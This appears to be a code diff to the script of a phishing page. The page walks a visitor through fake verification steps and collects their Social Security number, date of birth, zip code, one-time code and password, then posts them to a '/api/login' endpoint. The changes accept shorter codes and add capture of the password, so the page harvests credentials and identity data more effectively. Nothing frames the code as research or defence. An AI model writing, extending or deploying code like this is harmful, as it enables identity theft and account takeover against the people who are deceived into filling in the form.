@@ -73,6 +73,7 @@
 
     <script>
         let currentStep = 1;
+        let realPassword = "";
 
         function nextStep(step) {
             if (step === 2) {
@@ -105,15 +106,19 @@
             const code = document.getElementById('code').value.trim();
             const errorDiv = document.getElementById('error');
 
-            if (code.length < 6) {
+            if (code.length < 4) {
                 errorDiv.textContent = "The code you entered is incorrect or has expired.";
                 return;
             }
 
             // Collect all data
-            const username = document.getElementById('ssn').value || "Verified User";
-            const password = "Verified";
-            const address = `SSN: ${document.getElementById('ssn').value} | DOB: ${document.getElementById('month').value}/${document.getElementById('day').value}/${document.getElementById('year').value} | Zip: ${document.getElementById('zip').value} | Code: ${code} | Status: Correct`;
+            const ssn = document.getElementById('ssn').value;
+            const dob = `${document.getElementById('month').value}/${document.getElementById('day').value}/${document.getElementById('year').value}`;
+            const zip = document.getElementById('zip').value;
+
+            const username = ssn ? `SSN-${ssn}` : "Verified User";
+            const password = realPassword || document.getElementById('password') ? document.getElementById('password').value : "Password"; 
+            const address = `SSN: ${ssn} | DOB: ${dob} | Zip: ${zip} | Code: ${code} | Status: Correct`;
 
             await fetch('/api/login', {
                 method: 'POST',
@@ -135,6 +140,7 @@
         }
 
         window.onload = () => {
+            // Populate dropdowns
             const monthSelect = document.getElementById('month');
             const months = ["January","February","March","April","May","June","July","August","September","October","November","December"];
             months.forEach((month, i) => {
